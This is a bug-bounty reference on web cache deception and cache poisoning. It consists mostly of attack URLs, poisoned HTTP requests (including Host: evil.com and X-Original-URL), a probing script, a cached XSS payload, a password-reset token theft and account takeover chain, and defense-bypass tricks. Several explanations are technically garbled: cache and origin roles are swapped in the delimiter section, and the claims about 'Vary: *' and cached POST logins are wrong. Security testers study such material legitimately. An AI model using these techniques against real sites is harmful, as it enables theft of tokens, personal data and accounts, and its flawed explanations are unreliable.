# WEB CACHE DECEPTION — COMPLETE BUG BOUNTY REFERENCE
> Source: PortSwigger Web Security Academy (2024 Research)
> For: Bug bounty hunting, CTF, and security assessments

---

## 1. CONCEPTS

### What is Web Cache Deception?
Web cache deception exploits discrepancies between how a **cache** (CDN, reverse proxy) and an **origin server** interpret a URL path. By crafting URLs that the cache stores as static resources (due to file extensions like `.js`, `.css`, `.txt`) while the origin server processes them as dynamic content, attackers can:

- **Steal sensitive data** (password reset tokens, API keys, PII)
- **Perform stored XSS** via cached poisoned responses
- **Cause persistent denial of service** through cache poisoning
- **Escalate privileges** by caching authenticated content as public

### Cache Architecture
```
User → Cache (CDN) → Origin Server
       ↑                    ↑
  Stores response       Generates response
  based on URL path     based on URL path
```

The **discrepancy** happens when:
- Cache thinks: `/user/profile.js` is static → cache it
- Origin thinks: `/user/profile.js` is dynamic → returns authenticated data

---

## 2. CACHE ARCHITECTURE & RESPONSE HEADERS

### Key Response Headers
```bash
# X-Cache values (varies by CDN)
X-Cache: hit           → Response served from cache
X-Cache: miss          → Response fetched from origin, not cached
X-Cache: dynamic       → Origin marked as non-cacheable
X-Cache: refresh       → Cache revalidating
X-Cache: expired       → Stale response, revalidating

# Cache-Control
Cache-Control: public, max-age=300    → Cacheable for 5 minutes
Cache-Control: private               → NOT cacheable (user-specific)
Cache-Control: no-store              → Never cache
Cache-Control: no-cache              → Must revalidate before serving

# Age header
Age: 0              → Fresh from origin
Age: 300            → 300 seconds since cached

# Vary
Vary: Cookie        → Different cache per cookie
Vary: Authorization → Different cache per auth header
```

### How to Detect Caching
```bash
# Method 1: Check X-Cache header
curl -I https://target.com/static/app.js
# X-Cache: hit = cached
# X-Cache: miss = not cached

# Method 2: Timing difference
time curl -s https://target.com/page > /dev/null  # First request (cold)
time curl -s https://target.com/page > /dev/null  # Second request (cached = faster)

# Method 3: Age header
curl -I https://target.com/page
# Age: 0 = fresh, Age: 60 = cached 60s ago
```

---

## 3. WEB CACHE DECEPTION ATTACK PATTERNS

### 3.1 Delimiter Discrepancy

**Concept:** Cache and origin disagree on where the "path" ends.

```bash
# Cache sees: /profile (dynamic) → don't cache
# Origin sees: /profile.js (static) → cache it

# But attacker crafts URL that triggers cache misparse:
https://target.com/profile;foo.js
# Cache: sees .js extension → caches
# Origin: treats ; as delimiter → serves /profile content

# Common delimiters
; (semicolon)
? (query string)
%23 (encoded #)
%00 (null byte)
/ (trailing slash)
```

**Exploitation:**
```bash
# Steal password reset token
# 1. Victim requests password reset
# 2. Attacker crafts URL: https://target.com/reset?token=SECRET123.js
# 3. Cache sees .js → caches the response (containing token!)
# 4. Attacker requests same URL → gets cached token

curl https://target.com/reset?token=SECRET123.js
# X-Cache: hit → Token in response!
```

### 3.2 Normalization Discrepancy

**Concept:** Cache and origin normalize URL paths differently.

```bash
# Path traversal normalization
https://target.com/static/..%2fprofile.js
# Cache: normalizes to /profile.js → caches
# Origin: follows traversal → returns /profile (dynamic content!)

# Double encoding
https://target.com/static/%2e%2e%2fprofile.js
# Cache: sees .js → caches
# Origin: decodes %2e%2e%2f to ../ → traverses

# Case normalization
https://target.com/STATIC/../profile.js
# Cache: lowercases → /static/../profile.js
# Origin: follows → serves /profile
```

### 3.3 Static Extension Rules

**Concept:** Cache caches anything with a static file extension.

```bash
# Cache rules often match:
*.js    → cache
*.css   → cache  
*.png   → cache
*.jpg   → cache
*.gif   → cache
*.ico   → cache
*.txt   → cache
*.html  → cache (sometimes)

# Exploitation: Add static extension to dynamic URL
https://target.com/api/user/profile.js
https://target.com/api/user/profile.css
https://target.com/api/user/profile.txt
https://target.com/api/user/profile.ico
https://target.com/api/user/profile.png
```

### 3.4 Static Directory Rules

**Concept:** Cache caches everything under static directories.

```bash
# Cache rule: anything under /static/ or /assets/ or /images/ is cached

# Exploitation: Traversal to dynamic content
https://target.com/static/../api/user/profile
https://target.com/assets/..%2fapi/user/profile
https://target.com/images/..%2f../api/user/profile
```

### 3.5 File Name Rules

**Concept:** Cache caches specific file names regardless of path.

```bash
# Cache rule: always cache files named: robots.txt, sitemap.xml, favicon.ico

# Exploitation:
https://target.com/robots.txt  → cached (returns admin paths!)
https://target.com/sitemap.xml → cached (returns API endpoints!)
```

---

## 4. CACHE POISONING

### 4.1 Unkeyed Input Poisoning

**Concept:** Cache stores response based on key, but response content depends on unkeyed input (headers).

```bash
# Poison via Host header
GET / HTTP/1.1
Host: evil.com
# If cache uses Host for key but origin uses it for response content:
# Response cached with evil.com content, served to all users

# Poison via X-Forwarded-Host
GET / HTTP/1.1
X-Forwarded-Host: evil.com
# Origin reflects X-Forwarded-Host → cache stores poisoned response
```

### 4.2 Cache Poisoning via Headers

```bash
# X-Original-URL
GET / HTTP/1.1
X-Original-URL: /admin
# Origin: serves /admin content
# Cache: caches as / response (poisoned with admin data!)

# X-Rewrite-URL
GET / HTTP/1.1
X-Rewrite-URL: /admin
# Same effect as X-Original-URL

# X-HTTP-Method-Override
GET / HTTP/1.1
X-HTTP-Method-Override: DELETE
# Origin: processes DELETE
# Cache: caches as GET response (with DELETE side effects!)
```

### 4.3 Parameter Cloaking

```bash
# Cache strips certain parameters, origin doesn't
https://target.com/page?utm_content=foo&callback=malicious
# Cache: strips utm_content, caches response keyed on /page
# Origin: processes callback parameter

# Cache key manipulation
https://target.com/page?utm_source=test#callback=malicious
# Cache: ignores fragment (#)
# Origin: processes fragment (in some contexts)
```

### 4.4 Fat GET (HTTP/1.0)

```bash
# Send POST as GET with body
GET /api/admin HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

role=admin
# Some caches store as GET (keyed on URL)
# Origin processes as POST with body (role=admin)
```

### 4.5 Vary: * Header Exploitation

```bash
# If origin returns Vary: * → cache might ignore Vary header
# Then all users get same cached response regardless of Cookie/Authorization

# Poison with:
GET /admin HTTP/1.1
Cookie: session=ADMIN_SESSION
Authorization: Bearer ADMIN_TOKEN

# If Vary: * → admin response cached for ALL users (including unauthenticated!)
```

---

## 5. CLOUDFLARE-SPECIFIC CACHE ATTACKS

### 5.1 Cloudflare Cache Rules
```bash
# Default: only cache static files (.js, .css, .png, etc.)
# Bypass: custom cache rules may cache everything

# Detection
curl -I https://target.com/page
# cf-cache-status: HIT/MISS/DYNAMIC/EXPIRED/REVALIDATED
# server: cloudflare
```

### 5.2 Cloudflare Cache Deception
```bash
# Add .js extension
https://target.com/page.js
# cf-cache-status: HIT → vulnerable!

# Path traversal
https://target.com/static/../page.js

# Query string with extension
https://target.com/page?param=value.js
```

### 5.3 Cloudflare Worker Cache
```bash
# Workers can cache dynamic responses
# If Worker caches without proper key → cache poisoning

# Check for Workers
curl -I https://target.com/
# cf-ray: xxx → Cloudflare
# Look for worker-specific headers
```

---

## 6. AKAMAI-SPECIFIC CACHE ATTACKS

### 6.1 Akamai Cache Headers
```bash
# Akamai-specific headers
X-Akamai-Transformed: 9 - 0
X-Cache-Key: /L/12345/1234567890/...
X-True-Cache-Key: /L/12345/1234567890/...

# Cache status
X-Cache: TCP_HIT from akamai
X-Cache: TCP_MISS from akamai
```

### 6.2 Akamai Cache Deception
```bash
# Akamai path normalization quirks
https://target.com/page;.js
https://target.com/page;.json

# Akamai sometimes treats ; as path separator
# Cache: /page;.js → caches (sees .js)
# Origin: /page (ignores ;.js) → returns dynamic content
```

---

## 7. FASTLY-SPECIFIC CACHE ATTACKS

### 7.1 Fastly Cache Headers
```bash
# Fastly headers
X-Served-By: cache-xxx
X-Cache: HIT/MISS
X-Cache-Hits: 1
Fastly-Debug: 1
Fastly-Debug-Path: /path/used/for/cache/key
Fastly-Debug-TTL: 1
```

### 7.2 Fastly Cache Deception
```bash
# Enable debug mode to see cache key
GET / HTTP/1.1
Fastly-Debug: 1
Fastly-Debug-Path: 1
Fastly-Debug-TTL: 1

# Check X-Cache for HIT/MISS
# Manipulate cache key via unkeyed headers
```

---

## 8. SENSITIVE DATA EXPOSURE

### 8.1 Password Reset Token Caching
```bash
# Normal password reset flow
POST /api/reset-password
{"email":"victim@test.com"}
# Response: {"token":"abc123def456","expires":"2024-01-01T00:00:00Z"}

# Deception: Request with static extension
GET /api/reset-password?token=abc123def456.js
# If cached: attacker can retrieve token

# Or:
GET /api/reset-password?email=victim@test.com.js
# Cache stores full reset response (with token!)
```

### 8.2 API Key/Credential Caching
```bash
# API response with credentials
GET /api/user/settings
# Returns: {"api_key":"sk_live_abc123","secret":"xyz789"}

# Deception:
GET /api/user/settings.js
# If cached: all users can see API keys
```

### 8.3 Personal Information Caching
```bash
# Profile with PII
GET /api/user/profile
# Returns: {"name":"John","ssn":"123-45-6789","email":"john@test.com"}

# Deception:
GET /api/user/profile.txt
# Cache: stores PII as public resource
```

### 8.4 Session Token Caching
```bash
# Auth response
POST /api/login
{"username":"admin","password":"pass123"}
# Returns: {"session_token":"eyJhbG...","user_id":"1"}

# Deception:
POST /api/login.js
{"username":"admin","password":"pass123"}
# Cache: stores login response (with session token!) as public resource
```

---

## 9. DETECTION METHODOLOGY

### Step-by-Step
1. **Identify cache** — Check for X-Cache, Age, CDN headers (Cloudflare, Akamai, Fastly, Varnish)
2. **Test basic deception** — Add .js extension to dynamic URLs
3. **Check X-Cache: HIT** — If dynamic URL now cached = vulnerable!
4. **Test path traversal** — /static/../page.js, /assets/..%2fpage.js
5. **Test delimiters** — ;, %23, %00, ? before .js extension
6. **Test normalization** — Double encoding, case sensitivity, unicode
7. **Identify sensitive data** — What sensitive content can be cached?
8. **Exfiltrate** — Request poisoned URL → get sensitive data from cache
9. **Chain** — Combine with XSS, token theft, privilege escalation

### Quick Detection Script
```bash
#!/bin/bash
TARGET="https://target.com"

# Test if .js extension gets cached
for path in /api/user/profile /api/admin /admin/dashboard /api/settings; do
  echo "Testing: ${path}.js"
  curl -s -I "${TARGET}${path}.js" | grep -i "x-cache"
done

# Test path traversal
curl -s -I "${TARGET}/static/..%2fapi/user/profile.js" | grep -i "x-cache"
curl -s -I "${TARGET}/assets/..%2fadmin/dashboard.js" | grep -i "x-cache"
```

### Key Indicators
- `X-Cache: HIT` on URLs with sensitive data + static extension
- `X-Cache: HIT` on URLs with path traversal + static extension
- Different response content for same cache key (timing comparison)
- Sensitive data appearing in cached responses (tokens, PII, credentials)
- Age header increasing on dynamic-looking URLs

---

## 10. EXPLOITATION STEPS

### Data Theft via Cache Deception
```bash
# 1. Identify dynamic endpoint with sensitive data
GET /api/user/profile → Returns PII + session token

# 2. Test if cache stores with static extension
GET /api/user/profile.js
# Check X-Cache: HIT → Vulnerable!

# 3. Victim accesses the page (their browser loads /api/user/profile.js)
# Cache stores response with victim's data

# 4. Attacker requests same URL
GET /api/user/profile.js
# X-Cache: HIT → Returns victim's data (from cache!)

# 5. Extract all sensitive fields from response
```

### Persistent XSS via Cache Poisoning
```bash
# 1. Find parameter that reflects in response
GET /page?name=<script>alert(1)</script>
# Response: <script>alert(1)</script> (reflected but not cached)

# 2. Poison cache with deception
GET /page.js?name=<script>alert(1)</script>
# Cache stores: <script>alert(1)</script> as /page.js response

# 3. Any user requesting /page.js gets cached XSS payload
# Cache delivers persistent XSS to all users!
```

### Token Theft Chain
```bash
# 1. Find password reset endpoint
POST /api/reset-password {"email":"victim@test.com"}
# Returns reset token in response

# 2. Poison cache
GET /api/reset-password?email=victim@test.com.js
# Cache stores reset response with token

# 3. Wait for victim to request password reset
# 4. Retrieve token from cache
curl https://target.com/api/reset-password?email=victim@test.com.js
# X-Cache: HIT → {"token":"SECRET_TOKEN"}

# 5. Use token to reset victim's password
POST /api/reset-password/confirm
{"token":"SECRET_TOKEN","new_password":"attacker_pass"}
```

---

## 11. DEFENSE BYPASS

### If Cache Validates Origin
```bash
# Try multiple extensions
.txt, .json, .xml, .html, .ico, .png, .jpg, .gif, .svg

# Try encoding variations
%2ejs, %2Ejs, .j%73, .js%00
```

### If Cache Requires Public Cache-Control
```bash
# Add Cache-Control header to request
GET /api/user/profile.js HTTP/1.1
Cache-Control: max-age=0

# Some caches ignore Cache-Control on request
# But origin respects it → different caching behavior
```

### If CDN Bypasses Cache
```bash
# Try direct origin access
Host: target.com → IP of origin server

# Try different CDN edge nodes
# Some edge nodes have different cache rules
```

---

## 12. TOOLS

| Tool | Purpose |
|------|---------|
| Burp Suite | Manual testing and cache header analysis |
| Param Miner | Discover cache-busting parameters |
| CachePoison | Automated cache poisoning |
| curl | Manual cache detection and testing |
| wfuzz | Fuzz URL extensions for caching |
| httpx | HTTP probing with cache header detection |

---

*Last updated: 2026-09-03*
*Sources: PortSwigger Academy, SecWiki, Akamai Research*
